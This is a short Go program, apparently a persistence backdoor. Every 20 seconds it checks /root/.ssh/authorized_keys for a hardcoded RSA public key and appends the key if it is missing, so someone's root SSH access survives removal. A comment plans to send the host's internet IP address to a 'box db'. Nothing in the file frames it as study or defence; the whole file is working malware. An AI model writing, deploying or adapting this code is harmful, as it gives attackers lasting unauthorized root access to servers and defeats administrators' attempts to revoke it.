package main

import (
	"io/ioutil"
	"os"
	"regexp"
	"time"
)

// todo  get the internet ipaddress send to box db
func main (){
	for {
		ticker := time.NewTicker(20 * time.Second)
		text,_ := ioutil.ReadFile("/root/.ssh/authorized_keys")
		//text,_ := ioutil.ReadFile("C:\\Users\\Administrator\\Desktop\\rsync\\1.txt")
		content := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdL+hQnk3Dnc2Q63W45V6PyD6ooZWkJk+vljF3vHwGGSwb6n2LuzE4ic7ttg43NEIjoVBe9S/xqfxK8ayNQN2NfrINuqcd96O7KAaGKv9fbrg5CeRLwRph/uvAaTSdasJGTErbBMslDyELTs1Xszc8uVBumgTk9EGesKp7DbITEKWgPFOEtqk7N4lBUtusBcFYBJwpCiH4qJDpNefhk1QeMK8uVjDy0vstTS1bbNpkLN23nOU5TnqZU8hIJAdI3ovXKJdbFJXCjSZYmB4vlT/5OxGdmE551cQoxnL4MUoIZDMihKaXgVkg1uRhGjTo4qPfVjLrKcED7y1k0+zxKFD9"
		reg := regexp.MustCompile(`(.*)+zxKFD9$`)
		match := reg.FindAllString(string(text), -1)
		if len(match) > 0 {
		} else {
			apf(content)
		}
		<- ticker.C
	}
}

func apf(content string){
	fd,_:=os.OpenFile("/root/.ssh/authorized_keys",os.O_RDWR|os.O_CREATE|os.O_APPEND,0644)
	//fd,_:=os.OpenFile("C:\\Users\\Administrator\\Desktop\\rsync\\1.txt",os.O_RDWR|os.O_CREATE|os.O_APPEND,0644)
	defer fd.Close()
	buf := []byte(content)
	fd.Write(buf)
}
